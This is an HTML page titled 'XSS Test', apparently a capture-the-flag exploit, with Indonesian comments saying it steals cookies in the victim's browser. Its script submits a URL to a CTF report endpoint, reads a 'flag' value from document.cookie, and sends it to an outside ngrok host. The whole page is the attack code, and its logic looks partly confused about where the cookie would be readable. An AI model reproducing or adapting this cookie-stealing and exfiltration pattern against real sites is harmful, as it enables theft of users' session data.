<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>XSS Test</title>
    <script>
        // Skrip XSS untuk mencuri cookie
        fetch('http://ctf.widyasecurity.com/report/', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ url: 'https://qyzan.github.io/joki/xss-challenge.html' })
        }).then(response => response.json())
          .then(data => {
              if (data.success) {
                  // Skrip ini akan dijalankan di browser korban
                  const flag = document.cookie.match(/flag=([^;]+)/);
                  if (flag) {
                      fetch('http://ctf.widyasecurity.com/report/', {
                          method: 'POST',
                          headers: { 'Content-Type': 'application/json' },
                          body: JSON.stringify({ url: 'https://6efe-180-252-62-25.ngrok-free.app/storeflag?flag=' + flag[1] })
                      });
                  }
              }
          });
    </script>
</head>
<body>
    <h1>XSS Test</h1>
</body>
</html>
